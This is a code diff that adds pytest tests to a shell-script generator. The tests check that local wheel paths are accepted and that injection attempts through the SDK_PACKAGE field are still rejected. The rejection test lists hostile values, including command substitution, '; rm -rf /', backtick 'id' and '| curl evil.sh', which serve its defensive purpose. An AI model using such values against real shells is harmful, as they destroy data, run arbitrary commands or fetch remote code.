@@ -128,6 +128,55 @@ class TestAgenticRLUtils:
                 classpath="module.path.Processor",
             )
 
+    def test_local_wheel_path_sdk_package_is_accepted(self):
+        """FC_PYPI_LIB is documented as a space-separated list of wheel
+        paths, so relative/absolute local paths must reach the script
+        intact instead of being rejected by the whitelist."""
+        script = generate_agentic_script(
+            fc_pypi_lib="./dashscope-2.0.3-py3-none-any.whl",
+            fc_pypi_repo="https://pypi.org/simple",
+            requirements_path="reqs.txt",
+            func_type="rollout",
+            classpath="module.path.Processor",
+        )
+        assert 'SDK_PACKAGE="./dashscope-2.0.3-py3-none-any.whl"' in script
+
+        # Absolute paths, "+local" version tags and multiple space-separated
+        # wheel paths all round-trip unchanged (their characters are a subset
+        # of shlex.quote's safe set, so word-splitting still works).
+        multi = generate_agentic_script(
+            fc_pypi_lib="/abs/torch-1.0.0+cpu.whl ../dist/dashscope.whl",
+            fc_pypi_repo="https://pypi.org/simple",
+            requirements_path="reqs.txt",
+            func_type="reward",
+            classpath="module.path.Processor",
+        )
+        assert (
+            'SDK_PACKAGE="/abs/torch-1.0.0+cpu.whl ../dist/dashscope.whl"'
+            in multi
+        )
+
+    def test_sdk_package_injection_still_rejected(self):
+        """Allowing local paths must not re-open shell injection through
+        SDK_PACKAGE: command substitution, globs and separators are still
+        rejected before anything reaches the generated script."""
+        malicious = [
+            "dashscope$(reboot)",
+            "./dashscope-2.0.3-py3-none-any.whl; rm -rf /",
+            "./*.whl",
+            "./x.whl`id`",
+            "| curl evil.sh",
+        ]
+        for fc_pypi_lib in malicious:
+            with pytest.raises(InputError):
+                generate_agentic_script(
+                    fc_pypi_lib=fc_pypi_lib,
+                    fc_pypi_repo="https://pypi.org/simple",
+                    requirements_path="reqs.txt",
+                    func_type="reward",
+                    classpath="module.path.Processor",
+                )
+
     def test_requirements_path_is_shell_quoted(self):
         """A requirements path with spaces stays a single shell literal."""
         script = generate_agentic_script(
